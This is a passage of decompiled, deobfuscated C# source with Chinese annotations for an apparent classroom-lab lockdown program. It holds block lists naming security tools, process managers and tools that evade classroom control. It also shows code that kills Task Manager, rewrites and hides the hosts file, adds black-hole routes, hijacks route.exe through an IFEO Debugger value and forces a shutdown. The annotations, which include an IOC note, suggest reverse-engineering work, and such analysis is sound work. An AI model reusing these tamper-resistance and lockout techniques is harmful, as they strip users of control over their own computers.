					this.processNameBlacklist[6] = "|QQPCTray.exe";
					this.processNameBlacklist[7] = "|360taskmgr";
					this.processNameBlacklist[8] = "|QQPCNetFlow.exe";
					this.processNameBlacklist[9] = "|360netman.exe";
					this.processNameBlacklist[10] = "|iu杀毒";
					this.processNameBlacklist[11] = "进程";
					this.processNameBlacklist[12] = "任务管理";
					this.processNameBlacklist[13] = "虚拟桌面";
					this.processNameBlacklist[14] = "|Minesweeper";
					this.processNameBlacklist[15] = "|winmine.exe";
					this.processNameBlacklist[16] = "|solitaire.exe";
					this.processNameBlacklist[17] = "|winrarrr.exe";
					this.processNameBlacklist[18] = "|wzmainnn.exe";
					this.processNameBlacklist[19] = "|bandizippp.exe";
					this.processNameBlacklist[20] = "|7zFMMM.exe";
					this.processNameBlacklist[21] = "|360zippp.exe";
					this.processNameBlacklist[22] = "掌控课堂";
					this.processNameBlacklist[23] = "夕颜若雪工具箱";
					this.processNameBlacklist[24] = "极域";
					this.processNameBlacklist[25] = "课堂狂欢器";
					this.processNameBlacklist[26] = "电子教室";
					this.processNameBlacklist[27] = "吾爱破解";
					this.processNameBlacklist[28] = "|NoTopDomain";
					// ---- 产品描述黑名单（索引 1~78，productBlacklistCount=78）----
					this.productDescriptionBlacklist[1] = "Windows 命令处理程序";
					this.productDescriptionBlacklist[2] = "Windows Command Processor";
					this.productDescriptionBlacklist[3] = "Windows PowerShell";
					this.productDescriptionBlacklist[4] = "注册表编辑器";
					this.productDescriptionBlacklist[5] = "Microsoft 管理控制台";
					this.productDescriptionBlacklist[6] = "任务管理器";
					this.productDescriptionBlacklist[7] = "PC Hunter";
					this.productDescriptionBlacklist[8] = "IceSword";
					this.productDescriptionBlacklist[9] = "Wsyscheck";
					this.productDescriptionBlacklist[10] = "SnipeSword";
					this.productDescriptionBlacklist[11] = "Process Explorer";
					this.productDescriptionBlacklist[12] = "狡兔二窟";
					this.productDescriptionBlacklist[13] = "Process-X";
					this.productDescriptionBlacklist[14] = "Process Master";
					this.productDescriptionBlacklist[15] = "PrcView";
					this.productDescriptionBlacklist[16] = "Process Viewer";
					this.productDescriptionBlacklist[17] = "PowerTool";
					this.productDescriptionBlacklist[18] = "Windows Kernel Explorer";
					this.productDescriptionBlacklist[19] = "FTCleaner";
					this.productDescriptionBlacklist[20] = "Process Lasso";
					this.productDescriptionBlacklist[21] = "process manager";
					this.productDescriptionBlacklist[22] = "Process Hacker";
					this.productDescriptionBlacklist[23] = "ProcessOVER";
					this.productDescriptionBlacklist[24] = "Dexpot";
					this.productDescriptionBlacklist[25] = "Deskman";
					this.productDescriptionBlacklist[26] = "iDesktop";
					this.productDescriptionBlacklist[27] = "YtMDesk";
					this.productDescriptionBlacklist[28] = "DexpotProPortable";
					this.productDescriptionBlacklist[29] = "Desktops";
					this.productDescriptionBlacklist[30] = "Wise Desktop";
					this.productDescriptionBlacklist[31] = "VDesktop";
					this.productDescriptionBlacklist[32] = "MagicDesktop";
					this.productDescriptionBlacklist[33] = "MultiDesk";
					this.productDescriptionBlacklist[34] = "小宝虚拟桌面";
					this.productDescriptionBlacklist[35] = "系统配置实用程序";
					this.productDescriptionBlacklist[36] = "资源和性能监视器";
					this.productDescriptionBlacklist[37] = "Special Setting Program";
					this.productDescriptionBlacklist[38] = "瑞星防火墙";
					this.productDescriptionBlacklist[39] = "火绒剑";
					this.productDescriptionBlacklist[40] = "超级进程王";
					this.productDescriptionBlacklist[41] = "OpenArk";
					this.productDescriptionBlacklist[42] = "Procmon";
					this.productDescriptionBlacklist[43] = "GameBar";
					this.productDescriptionBlacklist[44] = "Registry Workshop";
					this.productDescriptionBlacklist[45] = "屏幕键盘";
					this.productDescriptionBlacklist[46] = "暂 时 备 用";
					this.productDescriptionBlacklist[47] = "暂 时 备 用";
					this.productDescriptionBlacklist[48] = "暂 时 备 用";
					this.productDescriptionBlacklist[49] = "暂 时 备 用";
					this.productDescriptionBlacklist[50] = "暂 时 备 用";
					this.productDescriptionBlacklist[51] = "极域杀手";
					this.productDescriptionBlacklist[52] = "极域墓地制造器";
					this.productDescriptionBlacklist[53] = "极域杀死";
					this.productDescriptionBlacklist[54] = "翘课";
					this.productDescriptionBlacklist[55] = "夕颜若雪工具箱";
					this.productDescriptionBlacklist[56] = "学生机房Hack助手";
					this.productDescriptionBlacklist[57] = "再见极域";
					this.productDescriptionBlacklist[58] = "KillControl";
					this.productDescriptionBlacklist[59] = "去除控制";
					this.productDescriptionBlacklist[60] = "MsgFlood";
					this.productDescriptionBlacklist[61] = "极域工具包";
					this.productDescriptionBlacklist[62] = "Astrum For Online Classroom";
					this.productDescriptionBlacklist[63] = "JiYu Trainer";
					this.productDescriptionBlacklist[64] = "掌控课堂";
					this.productDescriptionBlacklist[65] = "FuckMythware";
					this.productDescriptionBlacklist[66] = "Hello Teacher";
					this.productDescriptionBlacklist[67] = "JIYUPLUS";
					this.productDescriptionBlacklist[68] = "极域Tool";
					this.productDescriptionBlacklist[69] = "微机课救星";
					this.productDescriptionBlacklist[70] = "极域X";
					this.productDescriptionBlacklist[71] = "UnMythware";
					this.productDescriptionBlacklist[72] = ModelVisitor.watermarkYiYuYanProgram;
					this.productDescriptionBlacklist[73] = "BITS管理实用程序";
					this.productDescriptionBlacklist[74] = "DzjsTools";
					this.productDescriptionBlacklist[75] = "SkiesKiller";
					this.productDescriptionBlacklist[76] = ModelVisitor.watermarkClassroomTerminator;
					this.productDescriptionBlacklist[77] = "MultiDeskTop应用程序";
					this.productDescriptionBlacklist[78] = "极域电子教室克星";
					this.productBlacklistCount = 78;
					// ---- 击杀任务管理器 ----
					Process[] processesByName = Process.GetProcessesByName("taskmgr");
					processesByName[0].Kill();
					// ---- 启动 WMI 进程创建监视（违规进程查杀）----
					string eventClassName = "__InstanceCreationEvent";
					TimeSpan withinInterval = new TimeSpan(0, 0, 1);
					WqlEventQuery query = new WqlEventQuery(eventClassName, withinInterval, "TargetInstance ISA 'Win32_Process'");
					this.wmiProcessWatcher = new ManagementEventWatcher(query);
					this.wmiProcessWatcher.EventArrived += this.WmiProcessCreated_CheckViolation;
					this.wmiProcessWatcher.Start();
					// ---- 极域注册表参数读取（64 位优先，为 0 则回退 32 位）----
					this.jiyuChannelId = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "ChannelId", ""));
					this.jiyuAutoLogin = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\Wow6432Node\\TopDomain\\e-Learning Class\\Student", "AutoLogin", ""));
					if (this.jiyuChannelId != 0)
					{
						this.jiyuRegistryBitness = 1;
						this.Timer_jiyu.Enabled = true;
					}
					else
					{
						this.jiyuChannelId = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "ChannelId", ""));
						this.jiyuAutoLogin = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\TopDomain\\e-Learning Class\\Student", "AutoLogin", ""));
						if (this.jiyuChannelId != 0)
						{
							this.jiyuRegistryBitness = 2;
							this.Timer_jiyu.Enabled = true;
						}
					}
					// ---- 极域两个核心服务自检（tdfilefilter / tdnetfilter）----
					if (this.tencentFileFilterService.Status == (ServiceControllerStatus)0 | this.tencentNetFilterService.Status == (ServiceControllerStatus)0)
					{
						this.jiyuServiceMonitorEnabled = false;   // 服务不存在
					}
					else
					{
						if (this.tencentFileFilterService.Status == ServiceControllerStatus.Stopped | this.tencentNetFilterService.Status == ServiceControllerStatus.Stopped)
						{
							this.tencentFileFilterService.Start();
							this.tencentNetFilterService.Start();
						}
						Thread.Sleep(1000);
						if (this.tencentFileFilterService.Status == ServiceControllerStatus.Running & this.tencentNetFilterService.Status == ServiceControllerStatus.Running)
						{
							this.jiyuServiceMonitorEnabled = true;
						}
					}
					// ---- 主密码与自启动项基准值 ----
					this.masterPasswordHash = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software", "n", ""));
					this.runKeyProzsValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", ""));
					if (this.runKeyProzsValue == "")
					{
						this.runKeyProzsValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "prozs", ""));
					}
					this.runKeyJfglzsnValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", ""));
					if (this.runKeyJfglzsnValue == "")
					{
						this.runKeyJfglzsnValue = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN", "jfglzsn", ""));
					}
					this.gaoweiHighRiskFlag = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "gaowei", 2));
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x0000670C File Offset: 0x0000490C
		/// <summary>
		/// 检查进程是否存在（原名 MoveTemplate）：Process.GetProcessesByName(name).Length > 0。
		/// </summary>
		private bool CheckProcessExists(string string_0)
		{
			return Process.GetProcessesByName(string_0).Length > 0;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x0000672C File Offset: 0x0000492C
		/// <summary>
		/// 获取有线网卡 IPv4：遍历非 virtual 描述、OperationalStatus.Up 的网卡，取第一个非回环 IPv4 地址；无则返回空串。
		/// </summary>
		public string GetWiredNetworkIP()
		{
			// [反混淆] 原状态机 ~60 行 → 还原为正常 for/foreach（VB On Error 样板 → catch 返回空串）
			try
			{
				NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
				for (int i = 0; i < allNetworkInterfaces.Length; i++)
				{
					NetworkInterface networkInterface = allNetworkInterfaces[i];
					// 跳过虚拟网卡，仅取 Up 状态的网卡
					if (!networkInterface.Description.ToLower().Contains("virtual") && networkInterface.OperationalStatus == OperationalStatus.Up)
					{
						foreach (UnicastIPAddressInformation unicastInfo in networkInterface.GetIPProperties().UnicastAddresses)
						{
							// 取第一个非回环 IPv4 地址
							if (unicastInfo.Address.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(unicastInfo.Address))
							{
								return unicastInfo.Address.ToString();
							}
						}
					}
				}
				return string.Empty;
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常时返回空串
				return string.Empty;
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000068C4 File Offset: 0x00004AC4
		/// <summary>
		/// 统计 string_1 中 string_0 出现次数（原名 SetTemplate，未使用，混淆残留）。
		/// </summary>
		private int CountSubstringOccurrences(string string_0, string string_1)
		{
			int num = 1;
			checked
			{
				int num2;
				for (;;)
				{
					num = Strings.InStr(num, string_1, string_0, CompareMethod.Binary);
					if (num == 0)
					{
						break;
					}
					num++;
					num2++;
				}
				return num2;
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000068F0 File Offset: 0x00004AF0
		/// <summary>
		/// 检查目标进程状态：无进程→NotFound；按 classroomProcessPath 全路径匹配；Responding 且被挂起(IsProcessSuspended)→Suspended；Responding→Running；否则 NotResponding；异常→NotResponding。
		/// </summary>
		public Form1.ProcessStatus CheckProcessStatus(string processName)
		{
			checked
			{
				Form1.ProcessStatus result;
				try
				{
					Process[] processesByName = Process.GetProcessesByName(processName);
					if (processesByName.Length == 0)
					{
						result = Form1.ProcessStatus.NotFound;
					}
					else
					{
						Process process = processesByName[0];
						int num = 0;
						int num2 = processesByName.Length - 1;
						int i;
						for (i = num; i <= num2; i++)
						{
							process = processesByName[i];
							string fileName = process.MainModule.FileName;
							if (Operators.CompareString(Strings.UCase(fileName), Strings.UCase(this.classroomProcessPath), false) == 0)
							{
								break;
							}
						}
						if (i == processesByName.Length)
						{
							result = Form1.ProcessStatus.NotFound;
						}
						else if (process.Responding)
						{
							if (this.IsProcessSuspended(process))
							{
								result = Form1.ProcessStatus.Suspended;
							}
							else
							{
								result = Form1.ProcessStatus.Running;
							}
						}
						else
						{
							result = Form1.ProcessStatus.NotResponding;
						}
					}
				}
				catch (Exception ex)
				{
					result = Form1.ProcessStatus.NotResponding;
				}
				return result;
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000069A0 File Offset: 0x00004BA0
		/// <summary>
		/// 检测进程是否被挂起（原名 IncludeTemplate）：遍历线程，ThreadState==Wait 且 WaitReason==Suspended 即判定被暂停。
		/// </summary>
		private bool IsProcessSuspended(Process process_0)
		{
			try
			{
				foreach (object obj in process_0.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					if (processThread.ThreadState == System.Diagnostics.ThreadState.Wait && processThread.WaitReason == ThreadWaitReason.Suspended)
					{
						return true;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return false;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00002210 File Offset: 0x00000410
		/// <summary>
		/// Timer4.Tick（原名 StartTemplate）：Form4 不可见时调用 MyForms.Form4.Show() 强制弹出二级锁定窗。
		/// </summary>
		private void Timer4Tick_ShowLockForm4(object sender, EventArgs e)
		{
			if (!TokenizerConfig.MyForms.Form4.Visible)
			{
				TokenizerConfig.MyForms.Form4.Show();
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00006A14 File Offset: 0x00004C14
		/// <summary>
		/// Form1.FormClosing（原名 CancelTemplate）：停止并释放 WMI 监视器 wmiProcessWatcher。
		/// </summary>
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.wmiProcessWatcher != null)
			{
				this.wmiProcessWatcher.Stop();
				this.wmiProcessWatcher.Dispose();
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00006A40 File Offset: 0x00004C40
		/// <summary>
		/// 显示违规警告(Form3)（原名 PrintTemplate）：文案"你运行的软件违规！如有误判，请老师拍照与作者QQ联系。"（死机时提示 ctrl+alt+del 注销；解压软件专用文案）；shuoming3 显示 w4yw4y3tq3yszz<进程名>mmfnfxhghrts（作者水印/防冒充标记）。
		/// </summary>
		private void ShowViolationWarning()
		{
			TokenizerConfig.MyForms.Form3.shuoming.Text = "你运行的软件违规！如有误判，请老师拍照与作者QQ联系。";
			if (this.productMatchIndex == 6)
			{
				TokenizerConfig.MyForms.Form3.shuoming.Text = "注：电脑死机时，不能用任务管理器，可同时按ctrl+alt+del三个键，点 注销 ，电脑不会自动还原。";
			}
			if (this.processMatchIndex >= 17 & this.processMatchIndex <= 21)
			{
				TokenizerConfig.MyForms.Form3.shuoming.Text = "本电脑禁止使用解压软件，如果确有需要，请老师来退出小助手。";
			}
			TokenizerConfig.MyForms.Form3.shuoming3.Text = "w4yw4y3tq3yszz" + Strings.Replace(this.currentProcessName, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts";
			TokenizerConfig.MyForms.Form3.Show();
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00006B08 File Offset: 0x00004D08
		/// <summary>
		/// 显示杀软/虚拟机警告(Form2)（原名 VisitTemplate）：文案"你运行了杀毒类、虚拟机类的软件！..."；shuoming3 显示 gyhrw4yw4y3tq3yszz<进程名>mmfnfxhghrts；并启用 Timer2 锁屏。
		/// </summary>
		private void ShowAntivirusWarning()
		{
			TokenizerConfig.MyForms.Form2.shuoming.Text = "你运行了杀毒类、虚拟机类的软件！危害电子教室运行，如有误判，请老师拍照与作者QQ联系。";
			TokenizerConfig.MyForms.Form2.shuoming3.Text = "gyhrw4yw4y3tq3yszz" + Strings.Replace(this.currentProcessName, ".exe", "", 1, -1, CompareMethod.Binary) + "mmfnfxhghrts";
			TokenizerConfig.MyForms.Form2.Show();
			this.Timer2.Enabled = true;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00006B84 File Offset: 0x00004D84
		/// <summary>
		/// 更新 hosts 黑名单与路由封堵（原名 CreateTemplate(url, mode)）。
		/// 流程：1. IsPortOpen("www.baidu.com",443,2000) 探测外网，失败→hostsAdopted=false 返回；2. WebClient.DownloadFile(url,"c:\1.txt")；首行不含"www."→无效返回；3. 逐行扫描标记行"视频网站：/产品名：/IP地址："记录区间；4. 读现有 hosts 把已屏蔽域名（127.0.0.1 行第2列）放入 HashSet；5. 视频网站区间每行→去 http(s):// 取主机名→未屏蔽则追加 "127.0.0.1 <域名>"；mode=="off" 时产品名区间同样处理（本程序只传 "on"）；6. 产品名区间追加进 productDescriptionBlacklist（从 79 起）；7. 删 IFEO route.exe 旧键，对 IP 区间每个 IP 执行 route add <ip> mask 255.255.255.255 0.0.0.0 metric 1（黑洞路由）；8. 写回 IFEO route.exe\Debugger="null"（劫持 route.exe）；9. 写 hosts、hostsAdopted=true、设 ReadOnly|Hidden|System 属性、DisableCMD=0、ipconfig /flushdns。
		/// IOC：临时文件 c:\1.txt、黑名单 URL http://<zhuye>/hmd_net.txt。
		/// </summary>
		private void UpdateHostsBlacklistAndRouteBlock(string url, string mode)
		{
			// [反混淆] 原状态机 ~200 行 → 还原为顺序执行 + 多个 for 循环（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				// 1. 外网连通性探测失败 → 不接管 hosts
				if (!this.IsPortOpen("www.baidu.com", 443, 2000))
				{
					this.hostsAdopted = false;
					return;
				}
				// 2. 下载黑名单到临时文件 c:\1.txt
				string tempFile = "c:\\1.txt";
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile(url, tempFile);
				}
				string[] lines = File.ReadAllLines(tempFile);
				// 首行不含 "www." → 文件无效
				if (Strings.InStr(lines[0], "www.", CompareMethod.Binary) == 0)
				{
					this.hostsAdopted = false;
					return;
				}
				// 3. 扫描标记行，记录各段区间（区间边界 = 标记行前一行 ~ 后一行；未找到时保持 0，与原 VB 默认值一致）
				int lineIndex = 0;
				int videoSectionStart = 0, videoSectionEnd = 0, productSectionStart = 0, productSectionEnd = 0, ipSectionStart = 0, ipSectionEnd = 0;
				for (int i = 0; i < lines.Length; i++)
				{
					string currentLine = lines[i];
					if (currentLine == "视频网站：")
					{
						videoSectionStart = lineIndex - 1;
						videoSectionEnd = lineIndex + 1;
					}
					if (currentLine == "产品名：")
					{
						productSectionStart = lineIndex - 1;
						productSectionEnd = lineIndex + 1;
					}
					if (currentLine == "IP地址：")
					{
						ipSectionStart = lineIndex - 1;
						ipSectionEnd = lineIndex + 1;
					}
					lineIndex++;
				}
				int lastLineIndex = lineIndex - 1;
				// 4. 读现有 hosts，收集已屏蔽域名（以 127.0.0.1 开头的行）
				File.SetAttributes(this.hostsFilePath, FileAttributes.Normal);   // 原代码此处重复调用两次，仅保留一次
				string hostsContent = File.ReadAllText(this.hostsFilePath);
				HashSet<string> blockedDomains = new HashSet<string>();
				string[] hostLines = hostsContent.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
				for (int j = 0; j < hostLines.Length; j++)
				{
					string hostLine = hostLines[j];
					if (hostLine.Trim().StartsWith("127.0.0.1"))
					{
						string[] parts = hostLine.Trim().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
						if (parts.Length > 1)
						{
							blockedDomains.Add(parts[1].ToLower());
						}
					}
				}
				// 5. 追加屏蔽条目
				StringBuilder hostsBuilder = new StringBuilder(hostsContent);
				hostsBuilder.AppendLine();
				// 5a. 视频网站段（lines[0..videoSectionStart]）
				for (int k = 0; k <= videoSectionStart; k++)
				{
					if (!string.IsNullOrEmpty(lines[k].Trim()))
					{
						string domain = lines[k].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
						if (!blockedDomains.Contains(domain))
						{
							hostsBuilder.AppendLine("127.0.0.1 " + domain);
						}
					}
				}
				// 5b. mode=="off" 时追加产品名段（本程序内调用恒为 "on"，此分支不生效）
				if (mode == "off")
				{
					for (int l = videoSectionEnd; l <= productSectionStart; l++)
					{
						if (!string.IsNullOrEmpty(lines[l].Trim()))
						{
							string domain2 = lines[l].Trim().Split(new char[] { '/' })[0].Replace("http://", "").Replace("https://", "").ToLower();
							if (!blockedDomains.Contains(domain2))
							{
								hostsBuilder.AppendLine("127.0.0.1 " + domain2);
							}
						}
					}
				}
				// 6. 产品名段 → 追加进动态产品黑名单（从索引 79 起）
				int blacklistIndex = this.productBlacklistCount + 1;
				for (int m = productSectionEnd; m <= ipSectionStart; m++)
				{
					this.productDescriptionBlacklist[blacklistIndex] = lines[m];
					blacklistIndex++;
				}
				// 7. 删除 IFEO route.exe 旧键，对 IP 段逐条封堵（黑洞路由，屏蔽目标服务器）
				ModelVisitor.DeleteRegistryKey(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\route.exe");
				for (int n = ipSectionEnd; n <= lastLineIndex; n++)
				{
					string ip = lines[n];
					Interaction.Shell("route add  " + ip + " mask 255.255.255.255 0.0.0.0 metric 1", AppWinStyle.Hide, true, -1);
				}
				// 8. 写回 IFEO：route.exe\Debugger="null"（劫持 route.exe，学生无法 route delete）
				ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\route.exe", "Debugger", "null", RegistryValueKind.String);
				// 9. 写 hosts 并设为只读+隐藏+系统属性，放开 cmd，刷新 DNS
				File.WriteAllText(this.hostsFilePath, hostsBuilder.ToString());
				this.hostsAdopted = true;
				File.SetAttributes(this.hostsFilePath, File.GetAttributes(this.hostsFilePath) | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
				ModelVisitor.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
				Interaction.Shell("ipconfig /flushdns", AppWinStyle.Hide, true, -1);
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00007264 File Offset: 0x00005464
		/// <summary>
		/// Ping 探测（原名 ConnectTemplate，未使用，混淆残留）：网络可用且 Ping 成功返回 true。
		/// </summary>
		private bool PingProbe(string string_0, int int_0)
		{
			if (!NetworkInterface.GetIsNetworkAvailable())
			{
				return false;
			}
			bool result;
			try
			{
				Ping ping = new Ping();
				PingReply pingReply = ping.Send(string_0, int_0);
				if (pingReply.Status == IPStatus.Success)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600006E RID: 110 RVA: 0x000072BC File Offset: 0x000054BC
		/// <summary>
		/// TCP 端口连通性探测：TcpClient.BeginConnect + AsyncWaitHandle.WaitOne(timeout)，超时/异常返回 false。
		/// </summary>
		public bool IsPortOpen(string hostname, int port, int timeout = 2000)
		{
			bool result;
			try
			{
				using (TcpClient tcpClient = new TcpClient())
				{
					IAsyncResult asyncResult = tcpClient.BeginConnect(hostname, port, null, null);
					if (asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds((double)timeout)))
					{
						tcpClient.EndConnect(asyncResult);
						result = tcpClient.Connected;
					}
					else
					{
						result = false;
					}
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000733C File Offset: 0x0000553C
		/// <summary>
		/// 强制关机：RtlAdjustPrivilege(19,1,0,...)（SE_SHUTDOWN_PRIVILEGE）+ NtShutdownSystem(2)（PowerOff）。
		/// </summary>
		public static void ForceShutdown()
		{
			int num = 0;
			Form1.RtlAdjustPrivilege(19, 1, 0, ref num);
			Form1.NtShutdownSystem(2);
		}

		// Token: 0x0400000D RID: 13
		[AccessedThroughProperty("Timer1")]
		/// <summary>
		/// Timer1 后备字段（6000ms：安装/重启 zmserv 服务、启动同伴进程 przs）。
		/// </summary>
		private System.Windows.Forms.Timer Timer1BackingField;

		// Token: 0x0400000E RID: 14
		[AccessedThroughProperty("Timer2")]
		/// <summary>
		/// Timer2 后备字段（1000ms：强制弹出全屏锁定窗 Form2）。
		/// </summary>
		private System.Windows.Forms.Timer Timer2BackingField;

		// Token: 0x0400000F RID: 15
		[AccessedThroughProperty("Timer_main")]
		/// <summary>
		/// Timer_main 后备字段（3000ms：主调度/启动序列）。
		/// </summary>
		private System.Windows.Forms.Timer TimerMainBackingField;

		// Token: 0x04000010 RID: 16
		[AccessedThroughProperty("Timer_usb")]
		/// <summary>
		/// Timer_usb 后备字段（5000ms：U 盘禁用检测）。
		/// </summary>
		private System.Windows.Forms.Timer TimerUsbBackingField;

		// Token: 0x04000011 RID: 17
		[AccessedThroughProperty("Timer_dzjs")]
		/// <summary>
		/// Timer_dzjs 后备字段（16000ms：电子教室进程守护）。
		/// </summary>
		private System.Windows.Forms.Timer TimerDzjsBackingField;

		// Token: 0x04000012 RID: 18
		[AccessedThroughProperty("Timer_wangluo")]
		/// <summary>
		/// Timer_wangluo 后备字段（17000ms：网络/IP 监控）。
		/// </summary>
		private System.Windows.Forms.Timer TimerWangluoBackingField;

		// Token: 0x04000013 RID: 19
		[AccessedThroughProperty("Timer_jcm")]
		/// <summary>
		/// Timer_jcm 后备字段（5000ms：死定时器，无 Tick 处理器）。
		/// </summary>
		private System.Windows.Forms.Timer TimerJcmBackingField;

		// Token: 0x04000014 RID: 20
		[AccessedThroughProperty("Timer_fhq")]
		/// <summary>
		/// Timer_fhq 后备字段（13000ms：防火墙监控与强制关闭）。
		/// </summary>
		private System.Windows.Forms.Timer TimerFhqBackingField;

		// Token: 0x04000015 RID: 21
		[AccessedThroughProperty("Timer_qdx")]
		/// <summary>
		/// Timer_qdx 后备字段（3000ms：注册表保护）。
		/// </summary>
		private System.Windows.Forms.Timer TimerQdxBackingField;

		// Token: 0x04000016 RID: 22
		[AccessedThroughProperty("Timer4")]
		/// <summary>
		/// Timer4 后备字段（1000ms：强制弹出二级锁定窗 Form4）。
		/// </summary>
		private System.Windows.Forms.Timer Timer4BackingField;

		// Token: 0x04000017 RID: 23
		[AccessedThroughProperty("Timer_jiyu")]
		/// <summary>
		/// Timer_jiyu 后备字段（15000ms：极域参数与服务监控）。
		/// </summary>
		private System.Windows.Forms.Timer TimerJiyuBackingField;

		// Token: 0x04000018 RID: 24
		[AccessedThroughProperty("Timer3")]
		/// <summary>
		/// Timer3 后备字段（1000ms：死定时器，无 Tick 处理器）。
		/// </summary>
		private System.Windows.Forms.Timer Timer3BackingField;

		// Token: 0x04000019 RID: 25
		[AccessedThroughProperty("Timer_updatehosts")]
		/// <summary>
		/// Timer_updatehosts 后备字段（10000ms：重新下载黑名单更新 hosts）。
		/// </summary>
		private System.Windows.Forms.Timer TimerUpdateHostsBackingField;

		// Token: 0x0400001A RID: 26
		[AccessedThroughProperty("Timer_route")]
		/// <summary>
		/// Timer_route 后备字段（11000ms：IFEO route.exe 键保护）。
		/// </summary>
		private System.Windows.Forms.Timer TimerRouteBackingField;

		// Token: 0x0400001B RID: 27
		/// <summary>
		/// 常量 0（混淆残留，未使用）。
		/// </summary>
		private const int _ClientConfig = 0;

		// Token: 0x0400001C RID: 28
		/// <summary>
		/// 常量 5（混淆残留，未使用）。
		/// </summary>
		private const int printerConfig = 5;

		// Token: 0x0400001D RID: 29
		/// <summary>
		/// 主调度计数（原名 advisorConfig）：Timer_main 每 Tick +1，按 2/7/10/12 分阶段启用功能定时器。
		/// </summary>
		private long mainTickCounter;

		// Token: 0x0400001E RID: 30
		/// <summary>
		/// hosts 更新计数（原名 m_StatusConfig）：Timer_updatehosts 每 Tick +1，>3 次后 Interval 改为 60s 降频。
		/// </summary>
		private long updateHostsTickCounter;

		// Token: 0x0400001F RID: 31
		/// <summary>
		/// 布尔标志（混淆残留，未使用）。
		/// </summary>
		private bool _TestsConfig;

		// Token: 0x04000020 RID: 32
		/// <summary>
		/// 断网警告窗是否已显示（原名 consumerConfig）。
		/// </summary>
		private bool networkDownWarningShown;

		// Token: 0x04000021 RID: 33
		/// <summary>
		/// 布尔标志（混淆残留，未使用）。
		/// </summary>
		private bool _RoleConfig;

		// Token: 0x04000022 RID: 34
		/// <summary>
		/// 电子教室被暂停警告窗是否已显示（原名 annotationConfig）。
		/// </summary>
		private bool classroomPausedWarningShown;

		// Token: 0x04000023 RID: 35
		/// <summary>
		/// 防火墙警告窗是否已显示（原名 _WatcherConfig）：恢复后自动关闭 Form3。
		/// </summary>
		private bool firewallWarningShown;

		// Token: 0x04000024 RID: 36
		/// <summary>
		/// 极域参数警告窗是否已显示（原名 readerConfig）。
		/// </summary>
		private bool jiyuParamWarningShown;

		// Token: 0x04000025 RID: 37
		/// <summary>
		/// 极域服务警告窗是否已显示（原名 adapterConfig）。
		/// </summary>
		private bool jiyuServiceWarningShown;

		// Token: 0x04000026 RID: 38
		/// <summary>
		/// 密码修改警告窗是否已显示（原名 _MockConfig）。
		/// </summary>
		private bool passwordWarningShown;

		// Token: 0x04000027 RID: 39
		/// <summary>
		/// IP 修改警告窗是否已显示（原名 callbackConfig）。
		/// </summary>
		private bool ipChangedWarningShown;

		// Token: 0x04000028 RID: 40
		/// <summary>
		/// 布尔标志（混淆残留，未使用）。
		/// </summary>
		private bool _ServerConfig;

		// Token: 0x04000029 RID: 41
		/// <summary>
		/// IFEO 被修改警告窗是否已显示（原名 stubConfig）。
		/// </summary>
